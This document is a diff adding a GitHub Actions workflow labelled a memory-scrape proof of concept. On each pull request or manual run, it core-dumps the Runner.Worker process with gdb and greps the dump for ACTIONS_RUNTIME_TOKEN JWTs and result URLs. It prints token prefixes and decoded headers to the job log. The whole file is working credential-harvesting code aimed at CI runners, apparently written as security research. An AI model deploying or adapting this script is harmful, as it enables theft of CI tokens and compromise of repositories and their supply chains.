@@ -1,0 +1,71 @@
+name: Memory Scrape PoC
+on:
+  pull_request:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  scrape:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.21' }
+
+      - name: Memory scrape Runner.Worker
+        run: |
+          set +e
+          echo "=== ptrace_scope (lower = more permissive) ==="
+          cat /proc/sys/kernel/yama/ptrace_scope 2>&1
+          echo ""
+          echo "=== Capabilities ==="
+          grep -E "Cap|Uid|Gid" /proc/self/status | head -10
+          echo ""
+          echo "=== Find Runner.Worker ==="
+          worker_pid=$(pgrep -f "Runner.Worker" | head -1)
+          echo "Worker PID: $worker_pid"
+          echo "Our PID: $$"
+          echo "Our PPID chain:"
+          pid=$$
+          while [ "$pid" != "1" ] && [ -n "$pid" ]; do
+            echo "  $pid: $(cat /proc/$pid/comm 2>/dev/null) (ppid=$(awk '{print $4}' /proc/$pid/stat 2>/dev/null))"
+            pid=$(awk '{print $4}' /proc/$pid/stat 2>/dev/null)
+          done
+          echo ""
+          echo "=== Try direct /proc/$worker_pid/mem read (small chunk) ==="
+          dd if=/proc/$worker_pid/mem bs=1 count=10 2>&1 | head -5
+          echo ""
+          echo "=== Install gcore and try to dump Worker process memory ==="
+          sudo apt-get install -y gdb 2>&1 | tail -2
+          echo ""
+          echo "=== gcore the worker ==="
+          mkdir -p /tmp/dump
+          cd /tmp/dump
+          sudo gcore -o worker_dump $worker_pid 2>&1 | tail -10
+          ls -la /tmp/dump/
+          echo ""
+          echo "=== Search dump for ACTIONS_RUNTIME_TOKEN ==="
+          if ls /tmp/dump/worker_dump.* 2>/dev/null; then
+            for dump in /tmp/dump/worker_dump.*; do
+              echo "--- Searching $dump ---"
+              # JWT format: starts with "eyJ" (base64 of {")
+              strings "$dump" 2>/dev/null | grep -E "^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\." | head -5 | while read jwt; do
+                echo "FOUND JWT (length ${#jwt}):"
+                echo "  $(echo "$jwt" | head -c 60)..."
+                # Decode header
+                header=$(echo "$jwt" | cut -d. -f1)
+                padded="${header}$(printf '%*s' $((4 - ${#header} % 4)) '' | tr ' ' '=')"
+                echo "  Header: $(echo "$padded" | base64 -d 2>/dev/null)"
+              done
+              # Also search for the URL pattern  
+              echo ""
+              echo "--- ACTIONS_RESULTS_URL hunt ---"
+              strings "$dump" 2>/dev/null | grep -E "results-receiver\.actions\.githubusercontent\.com" | head -3
+              # And the env var name itself
+              echo ""
+              echo "--- ACTIONS_RUNTIME_TOKEN= hunt ---"
+              strings "$dump" 2>/dev/null | grep -E "^ACTIONS_RUNTIME_TOKEN=" | head -3 | sed 's/=.\{30,\}/=<REDACTED>/'
+            done
+          fi
